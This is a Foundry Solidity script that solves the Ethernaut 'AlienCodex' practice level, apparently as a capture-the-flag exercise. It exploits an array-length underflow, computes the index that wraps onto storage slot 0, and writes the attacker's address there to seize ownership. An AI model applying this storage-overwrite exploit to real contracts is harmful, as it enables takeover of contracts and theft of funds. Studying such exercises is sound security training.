// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import "./IAlienCodex.sol";//Use this contract instead of the original, cause the version below 0.6.0 is not supported by foundry

contract AlienCodexScript is Script {

    address internal attacker;
    address internal deployer;
    IAlienCodex target;

    /** 
        SETUP SCENARIO
    */
    function setUp() public {
        uint chainId;
        assembly { chainId := chainid() }
        if (chainId == 5) { //goerli chian
            /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
            attacker = msg.sender;
            /** Setup contract and required init (you may have to modify this section) **/
            target = IAlienCodex(0x0000000000000000000000000000000000000000); //attach to an existing contract
        }else{ // local - chainid = 31137
            /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
            // deployer = vm.addr(1);
            // attacker = vm.addr(1337);
            // vm.label(deployer, "Deployer");
            // vm.label(attacker, "Attacker");
            // /** Airdrop (NO NEED TO CHANGE ANYTHING HERE?) **/
            // vm.deal(deployer, 100 ether);
            // vm.deal(attacker, 0.5 ether);
            // /** Setup contract and required init (you may have to modify this section) **/
            // vm.startBroadcast(deployer);
            // target = new IAlienCodex();
            // vm.stopBroadcast();
        }
    }

    /** 
        CODE YOUR EXPLOIT HERE 
        Do not forget to broadcast as the attacker :)
    **/
    function run() public {
        console.log("[Info]");
        console.log("attacker : %s", attacker);
        console.logBytes32(vm.load(address(target), bytes32(uint256(0))));

        console.log("[Exploit]");
        vm.startBroadcast(attacker);
        target.make_contact();
        console.log("contact : %s", target.contact());
        target.retract();
        bytes32 content = bytes32(abi.encodePacked(uint96(1), bytes20(attacker)));
        uint256 index = type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
        target.revise(index, content);
        console.logBytes32(vm.load(address(target), bytes32(uint256(0))));
        vm.stopBroadcast();
    }
}